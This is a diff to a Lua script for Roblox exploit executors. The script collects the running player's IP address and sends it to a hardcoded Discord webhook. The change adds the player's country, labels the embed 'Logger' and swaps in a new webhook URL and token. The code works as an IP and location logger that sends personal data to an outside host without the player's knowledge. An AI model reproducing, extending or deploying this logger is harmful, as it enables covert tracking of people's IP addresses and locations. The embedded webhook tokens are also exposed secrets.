@@ -4,6 +4,7 @@ local Players = game:GetService('Players');
 local Player = Players.LocalPlayer;
 local Character = Player.Character;
 local TweenService = game:GetService("TweenService");
+local Localization = game:GetService("LocalizationService");
 local Info = TweenInfo.new(15,Enum.EasingStyle.Quad);
 
 function SendWebhook()
@@ -37,15 +38,20 @@ function SendWebhook()
 				["value"] = ExecutedIP,
 				["inline"] = true
 			},
+			{
+				["name"] = "__Country:__",
+				["value"] = Localization:GetCountryRegionForPlayerAsync(Player),
+				["inline"] = true
+			},
 		},
 		["footer"] = {
-			["text"] = "DBXL",
+			["text"] = 'Logger',
 			["icon_url"] = "https://cdn.discordapp.com/attachments/959947675900461096/1042254064655794187/unknown.png"
 		},
 		["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
 	};
 	(syn and syn.request or http_request or http.request) {
-		Url = 'https://discord.com/api/webhooks/965134951219605624/B9gdPBSnZmgw8l9YyDYLFnCYFz4eryVmHVlGXQvmbmGBIHQm5Tr8QDGpX7f_eN-b4YK6';
+		Url = 'https://discord.com/api/webhooks/1049206698872668222/AiNR5sSg5cxd6m5wXEIinUShRzTX5gz1ISiyqhm5zMWSFJ9iebppEIITfF-ArywLQEV7';
 		Method = 'POST';
 		Headers = {
 			['Content-Type'] = 'application/json';
